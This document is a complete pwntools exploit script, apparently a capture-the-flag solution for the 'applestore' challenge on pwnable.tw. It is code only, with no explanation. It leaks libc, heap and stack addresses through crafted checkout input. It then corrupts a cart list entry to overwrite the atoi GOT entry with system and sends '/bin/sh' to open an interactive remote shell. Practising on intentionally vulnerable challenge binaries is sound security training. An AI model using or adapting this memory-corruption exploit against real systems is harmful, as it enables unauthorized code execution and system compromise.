from pwn import *

local = 0
debug = 0

if local:
	s = process('./applestore_patched')
	if debug:
		gdb.attach(s, gdbscript='''
			b*0x08048abe
			b*system
			b*delete
			c
		''')
	else:
		raw_input('DEBUG')
else:
	s = remote('chall.pwnable.tw', 10104)

binary = ELF('applestore_patched')
libc = ELF('libc_32.so.6')
first = 0x0804b070

for i in range(20):
	s.sendlineafter(b'> ', b'2')
	s.sendlineafter(b'Device Number> ', b'2')

for i in range(6):
	s.sendlineafter(b'> ', b'2')
	s.sendlineafter(b'Device Number> ', b'1')

s.sendlineafter(b'> ', b'5')
s.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y')

s.sendlineafter(b'> ', b'4')
s.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y ' + p32(binary.got['read']) + p32(0) + p32(0) + p32(0))

s.recvuntil(b'27: ')

libc.address = int.from_bytes(s.recv(4), byteorder = 'little', signed = False) - libc.symbols['read']

log.info('libc base: 0x%x', libc.address)

s.sendlineafter(b'> ', b'4')
s.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y ' + p32(first) + p32(0) + p32(0) + p32(0))

s.recvuntil(b'27: ')

heap = int.from_bytes(s.recv(4), byteorder = 'little', signed = False) - 0x410

log.info('heap base: 0x%x', heap)

stack_leak = heap + 0x8c0

s.sendlineafter(b'> ', b'4')
s.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y ' + p32(stack_leak) + p32(0) + p32(0) + p32(0))

s.recvuntil(b'27: ')

stack = int.from_bytes(s.recv(4), byteorder = 'little', signed = False)

log.info('stack leak: 0x%x', stack)

log.info('system: 0x%x', libc.symbols['system'])

s.sendlineafter(b'> ', b'3')
s.sendlineafter(b'Item Number> ', b'27' + p32(0) + p32(0) + p32(binary.got['atoi'] + 0x18) + p32(stack + 0x18))

s.sendlineafter(b'> ', b'/bin/sh\x00\x00\x00' + p32(libc.symbols['system']))

s.interactive()
